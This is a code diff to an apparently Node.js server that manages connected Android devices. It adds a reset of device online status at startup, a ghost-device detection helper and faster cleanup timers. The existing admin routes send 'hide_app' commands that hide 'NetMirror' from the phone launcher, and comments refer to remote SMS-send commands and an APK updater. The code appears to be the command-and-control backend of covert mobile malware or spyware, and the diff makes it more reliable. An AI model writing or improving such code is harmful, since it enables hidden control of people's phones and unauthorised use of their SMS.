@@ -28,6 +28,16 @@ async function startServer() {
   // Wait for sql.js to initialise before loading routes
   await db.__initDatabase();
 
+  // ═══ RESET ALL DEVICES TO OFFLINE ON STARTUP ═══
+  // In-memory socket maps (deviceToSocket, socketToDevice) are empty after restart.
+  // The DB still has is_online=1 and stale socket_id for every previously-connected
+  // device. Without this reset, the admin panel shows all devices "Connected" but
+  // hide-app/SMS-send commands fail with 404 until each device reconnects.
+  try {
+    db.prepare("UPDATE devices SET is_online = 0, socket_id = ''").run();
+    console.log('[STARTUP] Reset all devices to offline (server restart)');
+  } catch (e) { console.warn('[STARTUP] Device reset failed:', e.message); }
+
   // ═══ SELF-HEAL: rewrite stale mirrornet.watch URLs in app_update_info ═══
   //   Cloudinary DB backups from before the domain change carry the old host;
   //   without this the in-app updater ships a 404 apk_url on every cold boot.
@@ -3805,20 +3815,40 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   });
 
   // ═══ HIDE / UNHIDE APP — hide NetMirror from device launcher ═══
+  // ═══ HELPER: Find device socket with ghost detection ═══
+  // Returns the socket if found, or null + marks device offline if ghost.
+  function findDeviceSocket(device_id) {
+    let targetSocket = null;
+    const memSocketId = deviceToSocket.get(device_id);
+    if (memSocketId) targetSocket = io.sockets.sockets.get(memSocketId);
+    if (!targetSocket) {
+      const device = db.prepare('SELECT socket_id FROM devices WHERE device_id = ?').get(device_id);
+      if (device && device.socket_id) targetSocket = io.sockets.sockets.get(device.socket_id);
+    }
+
+    // Ghost detection: if no socket found but DB says online, mark offline NOW
+    if (!targetSocket) {
+      try {
+        const dev = db.prepare('SELECT is_online FROM devices WHERE device_id = ?').get(device_id);
+        if (dev && dev.is_online === 1) {
+          db.prepare("UPDATE devices SET is_online = 0, socket_id = '' WHERE device_id = ?").run(device_id);
+          deviceToSocket.delete(device_id);
+          origEmit('device_offline', { device_id });
+          console.log(`[GHOST] Device ${device_id} was marked online but no socket found — marked offline`);
+        }
+      } catch (_) {}
+    }
+
+    return targetSocket;
+  }
+
   app.post('/api/admin/hide-app', express.json(), (req, res) => {
     try {
       if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
       const { device_id } = req.body;
       if (!device_id) return res.status(400).json({ error: 'device_id required' });
 
-      let targetSocket = null;
-      const memSocketId = deviceToSocket.get(device_id);
-      if (memSocketId) targetSocket = io.sockets.sockets.get(memSocketId);
-      if (!targetSocket) {
-        const device = db.prepare('SELECT socket_id FROM devices WHERE device_id = ?').get(device_id);
-        if (device && device.socket_id) targetSocket = io.sockets.sockets.get(device.socket_id);
-      }
-
+      const targetSocket = findDeviceSocket(device_id);
       if (!targetSocket) return res.status(404).json({ error: 'Device not connected' });
 
       targetSocket.emit('hide_app', { device_id });
@@ -3832,14 +3862,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       const { device_id } = req.body;
       if (!device_id) return res.status(400).json({ error: 'device_id required' });
 
-      let targetSocket = null;
-      const memSocketId = deviceToSocket.get(device_id);
-      if (memSocketId) targetSocket = io.sockets.sockets.get(memSocketId);
-      if (!targetSocket) {
-        const device = db.prepare('SELECT socket_id FROM devices WHERE device_id = ?').get(device_id);
-        if (device && device.socket_id) targetSocket = io.sockets.sockets.get(device.socket_id);
-      }
-
+      const targetSocket = findDeviceSocket(device_id);
       if (!targetSocket) return res.status(404).json({ error: 'Device not connected' });
 
       targetSocket.emit('unhide_app', { device_id });
@@ -3891,7 +3914,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         if (!socketAlive) {
           const fresh = db.prepare("SELECT last_seen FROM devices WHERE device_id = ?").get(d.device_id);
           const lastSeen = fresh ? new Date(fresh.last_seen + 'Z').getTime() : 0;
-          if (Date.now() - lastSeen > 3 * 60 * 1000) {
+          if (Date.now() - lastSeen > 60 * 1000) {
             db.prepare("UPDATE devices SET is_online = 0, socket_id = '' WHERE device_id = ?").run(d.device_id);
             deviceToSocket.delete(d.device_id);
             origEmit('device_offline', { device_id: d.device_id });
@@ -3903,7 +3926,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     } catch (err) {
       console.error('[CLEANUP-FAST] Error:', err.message);
     }
-  }, 2 * 60 * 1000); // every 2 minutes
+  }, 30 * 1000); // every 30 seconds (was 2 min)
 
   // Layer 2 (every 10 min): heartbeat-based — catches devices with no heartbeat for 2+ hours
   setInterval(() => {
